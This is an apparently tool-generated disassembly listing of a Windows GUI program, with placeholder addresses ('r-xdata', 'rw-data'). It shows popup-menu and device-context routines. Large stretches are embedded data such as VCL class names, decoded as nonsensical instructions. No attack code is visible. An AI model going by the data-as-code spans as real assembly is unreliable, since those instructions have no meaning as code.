mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_46f9ac
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_46fa14
jmp r-xdata
sub_463d8f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_463e48
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_418854
pop esi
pop ebx
retn
push ebx
push sub_4638b8
call sub_4224bc
mov [ ebx + 0x10 ] eax
sub_463e8c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_462a0c
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_463e48
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_463f00
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_463e70
mov edx ebx
and dl 0xfc
mov eax esi
call sub_462aa8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_463f58
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_45eda4
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_463714
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_463714
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_463fa0
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_45eda4
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46e558
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_4034ac
mov edx eax
jmp r-xdata
sub_463fec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_417330
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_463f58
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_462360
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_46285c
mov eax [ ebx + 0x34 ]
call sub_45fc04
mov eax ebx
call sub_463204
mov eax ebx
call sub_463fa0
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_45fd34
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4640a0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4189b0
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4189b0
cmp ebp [ eax ]
jne r-xdata
sub_4640dc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_424bc0
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_4243f4
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_424bc0
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_4243f4
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_4034ac
mov edx [ r-xdata ]
call sub_40343c
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_424bc0
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_4243f4
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_4641c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_404100
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_40436c
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_40460c
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_40436c
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_40460c
jmp r-xdata
sub_464258
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_4040ac
mov ebx 0x1
mov eax esi
call sub_40436c
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_404294
sub_4642bc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_464315
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4641c4
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4641c4
mov eax [ ebp - 0x8 ]
pop edx
call sub_4080e8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46431c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
sub_464324
adc al [ eax ]
add [ eax ] al
inc eax
into
dec eax
add ah al
xlat
dec eax
add [ esi + ecx * 8 ] bh
dec eax
add [ edi + edx * 8 + 0x48 ] dl
add [ eax ] bh
into
dec eax
add ah dl
salc
dec eax
add [ esi + ecx * 8 ] dh
dec eax
add [ eax ] ch
xlat
dec eax
add [ eax ] dh
into
dec eax
add [ ebx + ebx * 8 - 0x31d3ffb8 ] al
dec eax
add [ eax ] dh
xlat
dec eax
add [ eax ] ch
into
dec eax
add [ ecx + ebx * 8 + 0x48 ] ah
add [ esi + ecx * 8 ] ah
dec eax
add [ eax + ebx * 8 - 0x31dfffb8 ] bl
dec eax
add [ eax - 0x24 ] al
dec eax
add [ esi + ecx * 8 ] bl
dec eax
add [ esp + ebx * 8 ] bh
dec eax
add [ eax ] bl
into
dec eax
add [ eax ] dh
fmul [ eax ]
adc al 0xce
dec eax
add al bl
fisttp [ eax ]
adc dh cl
dec eax
add [ ebx + ebx * 8 - 0x31f3ffb8 ] cl
dec eax
add [ esp + ebx * 8 - 0x31f7ffb8 ] ch
dec eax
add [ esp + ebx * 8 + 0x48 ] ah
add [ esi + ecx * 8 ] al
dec eax
add [ eax + ebx * 8 + 0x48 ] al
add [ eax ] al
into
dec eax
add [ eax - 0x28 ] bl
dec eax
add ah bh
int 0x48
add ah al
fmul [ eax ]
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46441c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464423
retn
mov eax [ rw-data ]
call sub_4032b0
mov eax [ rw-data ]
call sub_4032b0
mov eax [ rw-data ]
call sub_4032b0
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404b54
mov eax rw-data
call sub_4040ac
sub_464428
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_464324
call sub_403dd4
mov eax [ r-xdata ]
call sub_417fe4
mov eax [ r-xdata ]
call sub_418084
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418030
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418030
mov eax [ r-xdata ]
call sub_417f28
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a328
mov [ rw-data ] eax
sub_4644b0
mov ah 0x44
inc esi
add [ ebx ] al
push cs
push esp
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
adc [ ebp + 0x46 ] al
add [ ebx ] al
andps xmm2 [ ebx + 0x63 ]
jb r-xdata
imul ebp [ esi + 0x64 ] 0x1
add [ ecx ] al
add [ eax ] al
add [ eax + 0xc004644 ] dh
jae r-xdata
inc eax
insb
insb
inc edx
popad
jb r-xdata
popad
jb r-xdata
dec eax
outsd
jb r-xdata
inc [ ecx ]
add [ 0x6f6c6f43 ] al
jb r-xdata
outsd
test al 0x45
inc esi
add [ eax ] cl
add [ eax ] al
int3
je r-xdata
or dh [ ebx + 0x73 ]
jae r-xdata
jae r-xdata
jpe r-xdata
add [ eax ] al
adc [ eax + eax ] 0x0
inc esp
inc esi
add [ eax ] cl
add [ eax ] al
dec [ eax ]
add [ eax ] al
[ eax + 0x4668 ]
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
jb r-xdata
rol al 0x45
inc esi
add [ edi ] al
add [ eax - 0x5fffbe70 ] bl
push 0x54110046
or [ edi - 0x6f6fffbf ] 0x41
insb
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax * 2 + 0x73090046 ] cl
jae r-xdata
inc ebx
outsd
outsb
je r-xdata
inc ecx
add [ eax - 0x67ffbe70 ] dl
nop
jb r-xdata
inc esi
insb
popad
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x6fffbe71 ] al
nop
inc ecx
outsd
je r-xdata
add ah dh
xor al 0x40
imul eax [ 0x6d726f46 ] 0x73
pushfd
outsb
je r-xdata
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
dec [ eax + 0x71 ]
inc esi
add [ ecx + esi * 2 + 0x46 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
push esp
arpl [ ebx + 0x5 ] bp
inc esi
outsd
jb r-xdata
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x8 ] al
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
jne r-xdata
add [ eax ] al
insb
push ebx
arpl [ edx + 0x6f ] si
add eax 0x6d726f46
jae r-xdata
je r-xdata
insb
or dh [ ebx + 0x62 ]
push esi
jb r-xdata
add [ eax ] al
[ 0x1ff0000 ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
popad
outsb
add [ gs : bx + si ] dl
imul ebp [ esi ] 0x2c004010
add [ eax ] al
jmp eax
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
je r-xdata
rol [ ebp + 0x46 ] 0x0
pop es
jae r-xdata
inc ebp
inc esi
add [ eax + 0x62 ] al
inc ecx
add [ 0x6f460500 ] cl
jb r-xdata
inc ecx
add [ eax + 0x11004668 ] ah
insd
inc ebp
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
insb
inc edx
popad
jb r-xdata
dec eax
add [ eax ] al
imul esp [ ebx + 0x61 ] 0x6f46056c
jb r-xdata
add ah ch
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add ah cl
cmp eax [ ebp ]
dec eax
xor al [ eax ]
xor al [ fs : eax ]
or al 0x74
inc esi
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edi + eax * 2 + 0x77080046 ] ah
jae r-xdata
jae r-xdata
call sub_403280
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a328
mov [ rw-data ] eax
retn
hlt
add [ eax ] al
add [ eax ] al
add al al
inc ebp
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x48004645 ] ch
add [ eax ] al
add ah cl
popad
inc ecx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
jae r-xdata
push 0x45
add [ eax - 0x3ffbb15 ] bl
pushad
inc ebp
add [ ecx ] bl
inc ebp
add [ esi + ebx * 2 ] dh
inc ebp
add al ah
0xeae40044 0x44
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
xchg esp eax
jae r-xdata
mov eax 0x1ae00044
inc edx
outsd
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
add [ eax + edx ] bh
inc eax
add [ eax + eax ] ah
add bh bh
sub [ edi + 0x46 ] 0x0
cmp al [ ebp ]
test al 0x1b
inc ebp
add [ eax + 0x4400455e ] cl
pop edi
inc ebp
add [ eax + 0x5a ] al
inc ebp
add [ eax ] ch
pop edi
inc ebp
add ah al
jpe r-xdata
add [ eax - 0x63ffba9a ] al
imul eax [ ebp ] 0xffffffe8
add [ ebx + ebp * 2 + 0x45 ] ch
add [ ebx + esi - 0x7053ffbb ] dl
inc ecx
add [ eax ] ch
sbb [ ebp ] eax
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
outsd
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
outsd
outsb
push ebx
imul edi [ edx + 0x65 ] r-xdata
sub [ eax ] al
add bh bh
les ebp [ edi + 0x46 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ 0x15011400 ] al
add [ eax - 0xbffb98c ] bl
xor al 0x45
add [ eax + 0x74 ] cl
inc esi
add ah bl
xor [ ebp ] eax
pop eax
je r-xdata
and al 0xed
inc esp
add [ eax + 0x20 ] cl
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
add [ eax + 0x3400467a ] ah
jpo r-xdata
add [ ebp + esi + 0x35900045 ] cl
inc ebp
add [ eax + 0x34 ] cl
inc ebp
add al dh
xor eax [ ebp ]
push 0x38004560
inc ebp
add [ edx + esi * 2 + 0x45 ] bl
add ah ah
pop esp
inc ebp
add ah dl
pop edi
inc ebp
add [ eax + 0x68004674 ] bh
ja r-xdata
inc edx
add al ah
pop ss
jae r-xdata
outsd
insb
outsd
jb r-xdata
jb r-xdata
add [ eax + 0x79 ] bh
inc esi
add al bl
je r-xdata
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
add [ eax + esi * 4 ] edi
in al dx
inc eax
jmp [ eax + 0x7c004679 ]
add [ ecx + edi * 2 + 0x60046 ] bl
add eax 0x15011400
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
push 0x1004671
sar [ eax ] 0x48
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 2 + 0x46 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 2 ] cl
inc esi
add [ edx ] dh
dec ecx
inc esi
add [ edx + eax ] bl
add [ eax ] al
push esp
add [ gs : eax ] dl
add eax 0x676e6152
adc [ eax ] al
or al 0x0
add bh bh
clc
outsd
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
add [ 0xffffffffc4000000 ] al
jae r-xdata
add [ eax ] cl
add al [ eax ]
call [ eax + 0x76 ]
inc esi
add [ esp + edx * 2 ] dl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
jb r-xdata
outsd
insb
cmp [ eax + 0x46 ] cl
add [ eax ] cl
mov esp 0xd0044
add eax 0x6d726f46
add [ eax ] al
je r-xdata
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
inc ebp
inc esi
add [ ebp + eax * 2 + 0x2080046 ] bh
add bh bh
push eax
jbe r-xdata
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
push esi
outsd
insb
nop
dec esp
dec ecx
inc esi
add [ edi ] al
jb r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax ] bh
add [ eax ] al
[ eax ]
jno r-xdata
inc [ eax ]
jno r-xdata
outsd
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
jae r-xdata
dec eax
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
dec ecx
inc esi
add [ ebx ] al
adc [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000b ] al
outsd
jb r-xdata
imul ebp [ esi + 0x43 ] 0x72746e6f
inc ebp
inc esi
add [ edx + eax ] cl
add bh bh
pushad
jbe r-xdata
add [ ebx ] al
or al 0x54
inc edx
outsd
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
inc eax
add [ ecx ] al
jae r-xdata
outsd
imul edi [ eax + 0x6f ] 0x41
add [ ecx ] al
movsd [ edi ] [ esi ]
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
lea eax [ eax ]
pop eax
dec edx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ eax + 0x3004647 ] ch
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
inc esi
add [ ecx ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
outsb
jne r-xdata
push ebx
je r-xdata
dec ecx
inc esi
add [ esi ] al
bound esi [ ebx + 0x4e ]
outsd
outsb
add eax 0xc4000000
inc esi
add [ edi ] cl
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
inc eax
add [ eax + 0x4a ] bl
invd
dec ecx
dec edi
insb
inc esi
add bh bh
dec [ ebx + 0x464a8cc0 ]
add [ edi ] cl
push ds
0xa34de72b 0xcc30
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah al
dec ecx
inc esi
add [ 0x6d726f46 ] al
inc edx
outsd
jb r-xdata
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
jb r-xdata
add [ 0x7a726f48 ] cl
add [ ebx ] al
add [ eax ] al
add [ eax ] cl
dec ebx
inc esi
add [ edx ] cl
imul edx [ ebx + 0x79 ] 0x6d657473
jae r-xdata
jae r-xdata
dec edx
inc esi
inc esi
add [ eax ] cl
ja r-xdata
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
insd
and al 0x11
jb r-xdata
or [ ecx + 0x4f ] cl
je r-xdata
dec [ ebp + 0x4abc0040 ]
inc esi
add [ ebx ] al
add bh bh
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x800464a ] bh
jae r-xdata
add [ eax ] eax
outsb
jb r-xdata
inc ebp
add [ esi + esi * 8 ] bh
inc esp
add al bh
sbb al [ edx ]
loopne r-xdata
imul eax [ ebp ] 0xffffff94
xor eax [ ebp ]
lodsb [ esi ]
pop [ ecx ]
sub [ ecx ] bl
inc ebp
add [ ebp * 8 + 0x20480044 ] ah
dec esi
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
outsd
jb r-xdata
inc eax
add [ ebx + ecx * 2 ] cl
lea eax [ eax ]
mov esp 0x300464a
outsd
jb r-xdata
inc esi
outsd
push cs
jo r-xdata
mov eax eax
pop esp
dec ebx
inc esi
outsd
jb r-xdata
insb
je r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
push eax
outsd
jb r-xdata
outsd
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
or al 0x4c
inc esp
popa
jne r-xdata
jb r-xdata
insb
jns r-xdata
jae r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
dec ebp
insd
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
jo r-xdata
jb r-xdata
je r-xdata
je r-xdata
inc esi
add [ ecx ] cl
insd
inc esp
jae r-xdata
add [ eax ] al
add [ esp + ecx * 2 ] cl
je r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
or al 0x54
rcr [ ebx + ecx * 2 + 0x46 ] 0x0
push es
inc esp
popa
inc esp
popa
jne r-xdata
adc [ esi + eax * 2 ] cl
je r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax + 0x4b ] dh
inc esi
add [ edx ] cl
jo r-xdata
push es
add eax 0x6d726f46
jae r-xdata
nop
insd
popad
jb r-xdata
adc [ eax + 0x6f ] dh
jo r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
dec ebx
inc esi
add [ eax + r-xdata ] dl
add ecx [ ecx ]
push esp
or [ ebx + 0x46 ] cl
popad
dec ebp
je r-xdata
push cs
je r-xdata
jne r-xdata
popad
je r-xdata
inc esi
add [ esi ] al
jns r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
dec esp
inc eax
add ah dh
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
inc esi
add [ esi ] al
inc esi
add [ esi ] al
jo r-xdata
dec esp
inc esi
add [ ebx ] al
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
outsd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
test al 0x4c
inc esp
jae r-xdata
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
lodsb [ esi ]
dec esp
inc esi
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
jb r-xdata
jo r-xdata
outsd
inc ebx
insb
push eax
jb r-xdata
jb r-xdata
outsd
outsb
inc esi
outsd
jae r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
add eax 0x6d726f46
jo r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x4c ] ah
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
hlt
jo r-xdata
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] al
inc eax
add [ eax - 0x72ffb9b4 ] ch
inc eax
add [ eax ] bh
dec ebp
inc esi
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
